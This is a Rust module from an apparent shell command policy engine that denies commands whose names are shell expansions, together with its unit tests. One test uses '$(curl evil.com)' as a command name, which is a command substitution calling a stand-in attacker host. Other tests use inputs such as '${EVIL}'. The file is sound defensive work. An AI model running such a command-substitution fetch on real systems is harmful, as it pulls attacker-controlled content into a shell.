//! Structural checks: minimal, hardcoded, non-overridable.
//!
//! Only checks where the engine literally cannot function — it can't build
//! a CommandInfo or determine the command name. Everything else (eval, source,
//! pipe-to-shell, etc.) is policy expressed as CEL rules in the default config.

use super::parse::{CommandInfo, word_has_expansion};
use super::{Decision, PolicyResult};

/// Check structural invariants. Returns Some(Deny) if violated, None to proceed.
///
/// Only two checks:
/// 1. Parse failure — can't build CommandInfo, can't evaluate CEL rules.
/// 2. Command name is an expansion — command.name is unknowable, CEL can't match.
pub fn check(commands: &[CommandInfo]) -> Option<PolicyResult> {
    for cmd in commands {
        if word_has_expansion(&cmd.name) {
            return Some(PolicyResult {
                decision: Decision::Deny,
                rule: format!("structural:unknowable_command (name: {})", cmd.name),
            });
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::policy::parse::parse_command;

    fn cmd(name: &str) -> CommandInfo {
        CommandInfo::simple(name)
    }

    #[test]
    fn literal_command_passes() {
        let cmds = vec![cmd("ls")];
        assert!(check(&cmds).is_none());
    }

    #[test]
    fn expansion_as_command_name_denied() {
        let cmds = vec![cmd("$(curl evil.com)")];
        let result = check(&cmds).unwrap();
        assert_eq!(result.decision, Decision::Deny);
        assert!(result.rule.contains("structural:unknowable_command"));
    }

    #[test]
    fn variable_as_command_name_denied() {
        let cmds = vec![cmd("$CMD")];
        let result = check(&cmds).unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn command_with_expansion_in_args_passes() {
        // Name is literal, only args have expansion — that's fine
        let cmds = parse_command("echo $(date)").unwrap();
        assert!(check(&cmds).is_none());
    }

    #[test]
    fn expansion_name_among_multiple_denied() {
        // One good command, one bad — flat list, both checked
        let cmds = vec![cmd("echo"), cmd("${EVIL}")];
        let result = check(&cmds).unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn empty_list_passes() {
        assert!(check(&[]).is_none());
    }

    #[test]
    fn multiple_commands_first_bad_denied() {
        let cmds = vec![cmd("$(bad)"), cmd("ls")];
        let result = check(&cmds).unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn multiple_commands_second_bad_denied() {
        let cmds = vec![cmd("ls"), cmd("$(bad)")];
        let result = check(&cmds).unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }
}
